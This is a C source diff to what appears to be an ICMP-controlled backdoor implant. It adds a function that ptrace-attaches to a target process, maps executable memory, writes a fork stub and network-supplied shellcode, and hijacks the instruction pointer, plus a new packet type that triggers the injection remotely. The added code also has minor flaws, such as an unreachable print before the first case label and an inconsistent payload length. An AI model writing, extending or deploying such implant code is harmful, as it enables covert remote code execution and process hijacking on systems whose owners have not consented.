@@ -66,12 +66,111 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 	}
 }
 
+int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, size_t shellcode_size) {
+	HIJACK *hijack = NULL;
+	unsigned long shellcode_addr;
+	struct user_regs_struct *backup = NULL;
+	
+	unsigned char fork_stub[] =
+        	"\x60"                          // pushad
+        	"\xb8\x02\x00\x00\x00"          // mov    $0x2,%eax
+        	"\x31\xdb"                      // xor    %ebx,%ebx
+        	"\xcd\x80"                      // int    $0x80
+        	"\x90\x90\x90"                  // nop ; nop ; nop
+        	"\x85\xc0"                      // test   %eax,%eax
+        	"\x74\x0c"                      // je     17 <child>
+        	"\x61"                          // popad
+        	"\x68\x44\x43\x42\x41"          // push dword 0x41424344
+        	"\xc3"                          // ret
+        	"\x90\x90\x90\x90"
+        	"\x90\x90\x90\x90"
+        	"\x90\x90\x90\x90"
+        	"\x90\x90\x90\x90"
+        	"\x90\x90\x90\x90";	
+	
+	DEBUG_WRAP(fprintf(stderr, "Received shellcode injection request into %d\n", pid));
+
+	if((hijack = InitHijack()) == NULL) {
+                DEBUG_WRAP(fprintf(stderr, "Unable to initialize libhijack.\n"));
+                return -1;
+        }	
+
+	DEBUG_WRAP(ToggleFlag(hijack, F_DEBUG));
+        DEBUG_WRAP(ToggleFlag(hijack, F_DEBUG_VERBOSE));
+	
+	if((AssignPid(hijack, pid)) != ERROR_NONE) {	
+		DEBUG_WRAP(fprintf(stderr, "Failed to assign the PID to the hijack instance.\n"));
+		return -1;
+	}
+
+	if(Attach(hijack) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to ptrace attach to %d.\n", pid));
+		return -1;
+	}
+	DEBUG_WRAP(fprintf(stderr, "Successfully attached to %d.\n", pid));
+
+	if((backup = GetRegs(hijack)) == NULL) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to get register state.\n"));
+		Detach(hijack);
+		return -1;
+	}
+	DEBUG_WRAP(fprintf(stderr, "Registers backed up\n"));
+
+	if(LocateSystemCall(hijack) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to resolve system calls.\n"));
+		Detach(hijack);
+		return -1;
+	}	
+	DEBUG_WRAP(fprintf(stderr, "Finished looking up system calls\n"));
+		
+	if((shellcode_addr = MapMemory(hijack, (unsigned long)NULL, 4096,PROT_READ | PROT_EXEC | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE)) == 0) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to map memory in the process.\n"));
+		Detach(hijack);
+		return -1;
+	}
+	DEBUG_WRAP(fprintf(stderr, "Memory mapped successfully: %p\n", (void *)shellcode_addr));
+	
+	if(WriteData(hijack, shellcode_addr, (unsigned char *)fork_stub, sizeof(fork_stub)) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to write the fork_stub to memory.\n"));
+		Detach(hijack);
+		return -1;
+	
+	}
+	DEBUG_WRAP(fprintf(stderr, "Fork stub written successfully\n"));
+
+	if(WriteData(hijack, shellcode_addr + sizeof(fork_stub) - 1, (unsigned char *)shellcode, shellcode_size) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to write the shellcode to memory.\n"));
+		Detach(hijack);
+		return -1;
+	}
+	DEBUG_WRAP(fprintf(stderr, "Shellcode written successfully\n"));
+
+	if(WriteData(hijack, shellcode_addr + 19, (unsigned char *)&backup->eip, 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->eip));
+		Detach(hijack);
+		return -1;
+	}
+	DEBUG_WRAP(fprintf(stderr, "Original EIP patched to %p\n", (void *)backup->eip));
+	
+	backup->eip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
+	if(SetRegs(hijack, backup) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Error setting new EIP\n"));
+		Detach(hijack);
+		return -1;
+	}	
+	DEBUG_WRAP(fprintf(stderr, "EIP updated\n"));
+
+	Detach(hijack);
+	DEBUG_WRAP(fprintf(stderr, "Red team go!\n"));
+	return 0;
+
+}
+
 void __attribute__ ((noinline)) execute_shellcode(const unsigned char *shellcode, const unsigned char *stack ) {
 
 #ifdef __i386__
 
-	// We dont' care about the old stack or frame pointer
-	__asm__("pop %eax");
+	// We dont' care about the old return address
 	__asm__("pop %eax");
 
 	// Save the new eip
@@ -98,7 +197,7 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	unsigned char *executable = NULL, *new_stack = NULL;
 	
 	// We need some more memory to work
-        if((executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
+	if((executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
 		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new executable area\n"));
 		return;
 	}
@@ -201,6 +300,7 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 					// Make sure we are in the child
 					if(pid == 0) {
 						switch(msg_type) {
+							printf("Hello there\n");
 							case MESSAGE_SHELLCODE:
 								DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
 								run_shellcode(decoded_data + hdr_len, data_len);
@@ -208,6 +308,10 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 							case MESSAGE_COMMAND:
 								DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
 								run_command(decoded_data + hdr_len, data_len, ip, icmp);
+								break;
+							case MESSAGE_REMOTE_SHELLCODE:
+								DEBUG_WRAP(fprintf(stderr, "Received remote shellcode packet\n"));
+								inject_remote_shellcode(*(uint16_t *)(decoded_data + hdr_len),decoded_data + hdr_len + 2, data_len - 1);
 								break;
 						}
 
@@ -242,7 +346,6 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 
 	// Data
 	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);
-	//size_data = (hdr->len - size_ip - size_icmp - SIZE_ETHERNET);
 
 	// Only want to deal with icmp echo requests
 	if((icmp->type == 8) && (icmp->code == 0)) {
